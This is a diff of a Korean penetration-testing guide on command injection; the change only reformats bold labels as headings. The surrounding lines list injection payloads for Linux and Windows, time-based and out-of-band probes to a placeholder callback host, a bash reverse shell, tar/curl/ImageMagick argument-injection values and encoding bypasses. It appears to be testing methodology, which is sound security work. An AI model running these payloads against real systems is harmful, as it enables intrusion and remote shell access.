@@ -1,6 +1,6 @@
 ### 기본 페이로드
 
-**Linux/macOS 메타문자 (셸 경유 sink):**
+#### Linux/macOS 메타문자 (셸 경유 sink)
 - `; id` (query/body)
 - `| id`
 - `|| id` (앞 명령 실패 시 실행)
@@ -11,21 +11,21 @@
 - `` `id` `` (backtick)
 - `<$(id)>` (process substitution, bash 4+)
 
-**Windows 메타문자:**
+#### Windows 메타문자
 - `& whoami` (query/body)
 - `&& whoami`
 - `| whoami`
 - `|| whoami`
 - `%0a whoami`
 
-**무해 확인 명령:**
+#### 무해 확인 명령
 
 | OS | 명령 |
 |---|---|
 | Linux | `id`, `whoami`, `uname -a`, `cat /etc/hostname`, `pwd`, `printenv` |
 | Windows | `whoami`, `dir`, `hostname`, `type C:\Windows\win.ini`, `ver` |
 
-**Time-based Blind:**
+#### Time-based Blind
 - `; sleep 5` (Linux)
 - `; ping -c 5 127.0.0.1` (Linux)
 - `& timeout 5` (Windows)
@@ -33,7 +33,7 @@
 - `; perl -e "sleep(5)"` (Perl)
 - `; python -c "import time;time.sleep(5)"` (Python)
 
-**OOB Blind (외부 콜백):**
+#### OOB Blind (외부 콜백)
 - `; curl https://CALLBACK.oast.fun/cmdi` (Linux)
 - `; wget https://CALLBACK/cmdi`
 - `; dig CALLBACK.oast.fun` (DNS)
@@ -41,7 +41,7 @@
 - `& nslookup CALLBACK.oast.fun` (Windows)
 - `; bash -i >& /dev/tcp/CALLBACK/4444 0>&1` (reverse shell)
 
-**Argument Injection (셸 미경유 sink, `ARG_INJECTION` 라벨):**
+#### Argument Injection (셸 미경유 sink, `ARG_INJECTION` 라벨)
 - `--checkpoint=1 --checkpoint-action=exec=sh -c id` (tar)
 - `--use-compress-program=id` (tar)
 - `-vv -ofile=/tmp/x.so` (curl/ssh)
@@ -49,7 +49,7 @@
 - `--config=/dev/stdin` + stdin 페이로드 (curl)
 - ImageMagick: `:|id` 같은 형태 입력 파일명 (CVE-2016-3714)
 
-**측정 (기준선 필수):**
+#### 측정 (기준선 필수)
 ```
 # 기준선 3회
 for i in 1 2 3; do curl -w "%{time_total}\n" -o /dev/null -s "https://target/api/ping?host=127.0.0.1"; done
@@ -75,11 +75,11 @@ for i in 1 2 3; do curl -w "%{time_total}\n" -o /dev/null -s "https://target/api
 | Windows + Linux 하이브리드 차단 | OS별 메타문자 다름 — Linux 차단했지만 Windows `^`, `%var%` 누락 |
 | sandbox/seccomp 격리 | 영향도 감소만 — 컨테이너 내부 실행 자체는 가능, 라벨링 필요 |
 
-**Process Substitution (bash 4+):**
+#### Process Substitution (bash 4+)
 - `<(id)`, `>(id)` — 일부 명령에서 파일 인자처럼 사용
 - `cmd <(echo $x)` 형태에 사용자 입력 시 추가 명령 실행
 
-**HEX/Octal/Base64 인코딩:**
+#### HEX/Octal/Base64 인코딩
 - `$'\x69\x64'` (HEX `id`)
 - `\151\144` (Octal)
 - `$(echo aWQ= \| base64 -d)` (base64 decoded `id`)
